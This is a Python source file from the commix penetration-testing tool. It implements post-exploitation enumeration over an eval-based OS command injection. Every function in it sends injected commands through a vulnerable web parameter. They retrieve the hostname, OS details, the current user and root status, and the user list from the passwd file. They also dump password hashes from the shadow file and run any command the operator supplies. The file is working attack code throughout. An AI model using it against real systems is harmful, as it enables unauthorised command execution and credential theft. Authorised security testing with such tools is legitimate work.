#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys

from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.injections.results_based.techniques.eval_based import eb_injector

"""
 The "eval-based" injection technique on Classic OS Command Injection.
"""

      
"""
Hostname enumeration
"""
def hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter):
  cmd = settings.HOSTNAME
  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
  shell = eb_injector.injection_results(response, TAG)
  if shell:
    shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
    if menu.options.verbose:
      print ""
    if not menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "(!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
    sys.stdout.flush()
      

"""
Retrieve system information
"""
def system_information(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter): 
  cmd = settings.RECOGNISE_OS            
  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
  target_os = eb_injector.injection_results(response, TAG)
  if target_os:
    target_os = "".join(str(p) for p in target_os).replace(" ", "", 1)[:-1]
    if menu.options.verbose:
      print ""
    if target_os == "Linux":
      cmd = settings.RECOGNISE_HP
      response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
      target_arch = eb_injector.injection_results(response, TAG)
      if target_arch:
        if menu.options.verbose:
          print ""
        target_arch = "".join(str(p) for p in target_arch).replace(" ", "", 1)[:-1]
        sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
        sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
        sys.stdout.flush()
    else:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n")
      sys.stdout.flush()


"""
The current user enumeration
"""
def current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter):
  cmd = settings.CURRENT_USER
  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
  cu_account = eb_injector.injection_results(response, TAG)
  if cu_account:
    cu_account = "".join(str(p) for p in cu_account).replace(" ", "", 1)[:-1]
    # Check if the user have super privileges.
    if menu.options.is_root:
      cmd = settings.ISROOT
      response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
      shell = eb_injector.injection_results(response, TAG)
      if menu.options.verbose:
        print ""
      if shell:
        shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
        if shell != "0":
            sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
            sys.stdout.flush()
        else:
          sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
          sys.stdout.flush()
    else:
      sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
      sys.stdout.flush()
        
"""
System users enumeration
"""
def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter): 
  cmd = settings.SYS_USERS             
  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
  sys_users = eb_injector.injection_results(response, TAG)
  if sys_users :
    if menu.options.verbose:
      print ""
    sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
    sys.stdout.flush()
    sys_users = "".join(str(p) for p in sys_users)
    sys_users = sys_users.replace("(@)", "\n")
    sys_users = sys_users.split()
    if len(sys_users) != 0 :
      sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
      sys.stdout.flush()
      count = 0
      for line in sys_users:
        count = count + 1
        fields = line.split(":")
        # System users privileges enumeration
        if menu.options.privileges:
          if int(fields[1]) == 0:
            is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
          elif int(fields[1]) > 0 and int(fields[1]) < 99 :
            is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
          elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
            if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
            elif int(fields[1]) == 60002:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
            else:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
          else :
            is_privilleged = ""
        else :
          is_privilleged = ""
        print "  ("+str(count)+") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privilleged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
    else:
      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
      sys.stdout.flush()
      print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL

"""
System passwords enumeration
"""
def system_passwords(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter): 
  cmd = settings.SYS_PASSES            
  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
  sys_passes = eb_injector.injection_results(response, TAG)
  if sys_passes :
    sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
    sys.stdout.flush()
    sys_passes = "".join(str(p) for p in sys_passes)
    sys_passes = sys_passes.replace("(@)", "\n")
    sys_passes = sys_passes.split( )
    if len(sys_passes) != 0 :
      sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
      sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
      sys.stdout.flush()
      count = 0
      for line in sys_passes:
        count = count + 1
        fields = line.split(":")
        if fields[1] != "*" and fields[1] != "!!" and fields[1] != "":
          print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
    else:
      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
      sys.stdout.flush()
      print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL

"""
Single os-shell execution
"""
def single_os_cmd_exec(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter):   
  cmd =  menu.options.os_cmd
  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
  shell = eb_injector.injection_results(response, TAG)
  if shell:
    shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
    if shell != "":
      print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL
    else:
      print "\n" + Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL
    sys.exit(0)

"""
Check the defined options
"""
def do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter):
  if menu.options.hostname:
    hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
    settings.ENUMERATION_DONE = True
  else:
    print ""
    
  if menu.options.current_user:
    current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
    settings.ENUMERATION_DONE = True

  if menu.options.sys_info:
    system_information(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
    settings.ENUMERATION_DONE = True

  if menu.options.users:
    system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
    settings.ENUMERATION_DONE = True

  if menu.options.passwords:
    system_passwords(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
    settings.ENUMERATION_DONE = True

  if settings.ENUMERATION_DONE == True:
    print ""
    
# eof